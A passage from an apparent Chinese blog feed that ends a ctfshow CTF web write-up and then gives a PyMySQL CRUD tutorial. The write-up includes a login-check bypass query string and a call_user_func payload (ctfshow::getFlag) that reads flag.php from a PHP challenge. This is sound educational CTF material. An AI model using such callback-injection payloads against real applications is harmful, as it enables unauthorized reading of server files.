当x为true时，直接跳过，不执行y ,同时与运算的优先级要高于或运算，所以我们只需要满足第三个条件就行。</p><blockquote><p>?username=admin&amp;password=admin&amp;code=admin </p></blockquote><h3 id="Web137"><a href="#Web137" class="headerlink" title="Web137"></a>Web137</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>考察调用类中的函数</p><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>–第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">ctfshow<span class="token operator">=</span><span class="token class-name static-context">ctfshow</span><span class="token operator">::</span><span class="token constant">getFlag</span><span class="token comment">#php中 ->与:: 调用类中的成员的区别，->用于动态语境处理某个类的某个实例，::可以调用一个静态的、不依赖于其他初始化的类方法。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3 MySQL 数据库连接 - PyMySQL 驱动</title>
      <link href="/2022/07/08/PyMySQL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/07/08/PyMySQL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3-MySQL-数据库连接-PyMySQL-驱动"><a href="#Python3-MySQL-数据库连接-PyMySQL-驱动" class="headerlink" title="Python3 MySQL 数据库连接 - PyMySQL 驱动"></a>Python3 MySQL 数据库连接 - PyMySQL 驱动</h1><p>[TOC]</p><p> PyMySQL 是在 Python3.x 版本中用于连接 MySQL 服务器的一个库，Python2 中则使用 mysqldb </p><p>准备要求：mysql8.0以上版本及python3.0以上版本。</p><h2 id="使用PyMySQL链接数据库"><a href="#使用PyMySQL链接数据库" class="headerlink" title="使用PyMySQL链接数据库"></a>使用PyMySQL链接数据库</h2><p>实例： 链接 Mysql 的 testdb 数据库： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token keyword">import</span> pymysql<span class="token comment"># 打开数据库连接</span>db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'testdb'</span><span class="token punctuation">)</span><span class="token comment"># 使用 cursor() 方法创建一个游标对象 cursor</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 使用 execute()  方法执行 SQL 查询</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT VERSION()"</span><span class="token punctuation">)</span><span class="token comment"># 使用 fetchone() 方法获取单条数据.</span>data <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Database version : %s "</span> <span class="token operator">%</span> data<span class="token punctuation">)</span><span class="token comment"># 关闭数据库连接</span>db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pymysql-connect-连接数据库函数"><a href="#pymysql-connect-连接数据库函数" class="headerlink" title="pymysql.connect()连接数据库函数"></a>pymysql.connect()连接数据库函数</h3><h4 id="pymysql-Connect-参数说明"><a href="#pymysql-Connect-参数说明" class="headerlink" title="pymysql.Connect()参数说明"></a>pymysql.Connect()参数说明</h4><table><thead><tr><th>host(str)</th><th>MySQL服务器地址</th></tr></thead><tbody><tr><td>port(int)</td><td>MySQL服务器端口号</td></tr><tr><td>user(str)</td><td>用户名</td></tr><tr><td>passwd(str)</td><td>密码</td></tr><tr><td>db(str)</td><td>数据库名称</td></tr><tr><td>charset(str)</td><td>连接编码</td></tr></tbody></table><h4 id="connection对象"><a href="#connection对象" class="headerlink" title="connection对象:"></a>connection对象:</h4><p>使用pymysql.Connect()生成的是一个connection对象，Connection对象也称为数据库连接对象，Connection对象的功能是负责对数据源的连接。</p><p>其功能包括：获取游标 <code>cursor()</code> ，<code>commit()</code>提交当前事务，<code>rollback()</code>回滚当前事务，<code>close()</code>关闭连接。</p><h3 id="cursor-获取游标"><a href="#cursor-获取游标" class="headerlink" title="cursor():获取游标"></a>cursor():获取游标</h3><p>要想操作数据库，光连接数据是不够的，必须拿到操作数据库的游标，才能进行后续的操作，比如读取数据、添加数据。通过获取到的数据库连接实例conn下的cursor()方法来创建游标。游标用来接收返回结果</p><p> cursor返回一个游标实例对象，其中包含了很多操作数据的方法</p><table><thead><tr><th>execute(op)</th><th>执行一个数据库的查询命令</th></tr></thead><tbody><tr><td>fetchone()</td><td>取得结果集的下一行</td></tr><tr><td>fetchmany(size)</td><td>获取结果集的下几行</td></tr><tr><td>fetchall()</td><td>获取结果集中的所有行</td></tr><tr><td>rowcount()</td><td>返回数据条数或影响行数</td></tr><tr><td>close()</td><td>关闭游标对象</td></tr></tbody></table><h2 id="对数据库的各种操作"><a href="#对数据库的各种操作" class="headerlink" title="对数据库的各种操作"></a>对数据库的各种操作</h2><h3 id="创建类操作："><a href="#创建类操作：" class="headerlink" title="创建类操作："></a>创建类操作：</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，不需要指定数据库，因为需要创建数据库</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">,</span>passwd <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#创建pythonBD数据库</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'CREATE DATABASE IF NOT EXISTS pythonDB DEFAULT CHARSET utf8 COLLATE utf8_general_ci;'</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#先关闭游标</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#再关闭数据库连接</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'创建pythonBD数据库成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h4><p>建立数据库连接后，可以使用创建的游标的<code>execute（）</code>方法将数据库表或记录创建到数据库表中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">,</span>user <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">,</span>passwd <span class="token operator">=</span> <span class="token string">"28283860"</span><span class="token punctuation">,</span>db <span class="token operator">=</span> <span class="token string">"pythondb"</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cursor<span class="token punctuation">)</span><span class="token comment">#创建user表</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'drop table if exists user'</span><span class="token punctuation">)</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">"""CREATE TABLE IF NOT EXISTS `user` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) NOT NULL,  `age` int(11) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0"""</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#先关闭游标</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#再关闭数据库连接</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'创建数据表成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作:"></a>插入操作:</h3><p>当要将记录创建到数据库表中时，需要执行<code>INSERT</code>操作。</p><p>插入单条数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，不指定数据库</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span><span class="token comment">#创建user表</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'drop table if exists user'</span><span class="token punctuation">)</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">"""CREATE TABLE IF NOT EXISTS `user` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) NOT NULL,  `age` int(11) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0"""</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>insert<span class="token operator">=</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into user values(1,'tom',18)"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'添加语句受影响的行数：'</span><span class="token punctuation">,</span>insert<span class="token punctuation">)</span><span class="token comment">#另一种插入数据的方式，通过字符串传入值</span>sql<span class="token operator">=</span><span class="token string">"insert into user values(%s,%s,%s)"</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'kongsh'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>select_db(“数据库名”) 可以用这种方式在数据库连接建立后指定数据库</p></blockquote><p>插入多条数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，同时指定数据库</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span><span class="token comment">#另一种插入数据的方式，通过字符串传入值</span>sql<span class="token operator">=</span><span class="token string">"insert into user values(%s,%s,%s)"</span>insert<span class="token operator">=</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'wen'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'批量插入返回受影响的行数：'</span><span class="token punctuation">,</span>insert<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：批量插入多条sql语句采用的是executemany(sql,args)函数，返回受影响的行数。args参数是一个包含多个元组的列表，每个元组对应一条mysql中的一条数据。这里的%s不需要加引号，否则插入数据的数据会类型错误</p><h3 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作:"></a>查询操作:</h3><blockquote><p>使用execute()函数得到的只是受影响的行数，并不能真正拿到查询的内容。cursor对象还提供了3种提取数据的方法：fetchone、fetchmany、fetchall.。每个方法都会导致游标动，所以必须注意游标的位置。<br>cursor.fetchone():获取游标所在处的一行数据，返回元组，没有返回None<br>cursor.fetchmany(size):接受size行返回结果行。如果size大于返回的结果行的数量，则会返回cursor.arraysize条数据。<br>cursor. fetchall():接收全部的返回结果行。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    res<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment">#表示已经取完结果集</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：从execute()函数的查询结果中取数据，以元组的形式返回游标所在处的一条数据，如果游标所在处没有数据，将返回空元组，该数据执行一次，游标向下移动一个位置。fetchone()函数必须跟exceute()函数结合使用，并且在exceute()函数之后使用 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#fetchone()函数实例：</span><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token comment">#取3条数据</span>resTuple<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchmany<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> resTuple<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：从exceute()函数结果中获取游标所在处的size条数据，并以元组的形式返回，元组的每一个元素都也是一个由一行数据组成的元组，如果size大于有效的结果行数，将会返回cursor.arraysize条数据，但如果游标所在处没有数据，将返回空元组。查询几条数据，游标将会向下移动几个位置。fetmany()函数必须跟exceute()函数结合使用，并且在exceute()函数之后使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token comment">#取所有数据</span>resTuple<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'共%d条数据'</span><span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：获取游标所在处开始及以下所有的数据，并以元组的形式返回，元组的每一个元素都也是一个由一行数据组成的元组，如果游标所在处没有数据，将返回空元组。执行完这个方法后，游标将移动到数据库表的最后</p><h3 id="更新操作："><a href="#更新操作：" class="headerlink" title="更新操作："></a>更新操作：</h3><h4 id="单条数据更新操作："><a href="#单条数据更新操作：" class="headerlink" title="单条数据更新操作："></a>单条数据更新操作：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#更新一条数据</span>update<span class="token operator">=</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"update user set age=100 where name='kongsh'"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'修改后受影响的行数为：'</span><span class="token punctuation">,</span>update<span class="token punctuation">)</span><span class="token comment">#查询一条数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from user where name="kongsh";'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多条数据更新操作："><a href="#多条数据更新操作：" class="headerlink" title="多条数据更新操作："></a>多条数据更新操作：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysqlconn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user where name in ('kongsh','wen');"</span><span class="token punctuation">)</span><span class="token comment">#更新前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'更新前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token comment">#更新2条数据</span>sql<span class="token operator">=</span><span class="token string">"update user set age=%s where name=%s"</span>update<span class="token operator">=</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'kongsh'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">'wen'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#更新2条数据后查询所有数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user where name in ('kongsh','wen');"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'更新后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="删除数据："><a href="#删除数据：" class="headerlink" title="删除数据："></a>删除数据：</h3><h4 id="删除单条数据："><a href="#删除单条数据：" class="headerlink" title="删除单条数据："></a>删除单条数据：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token 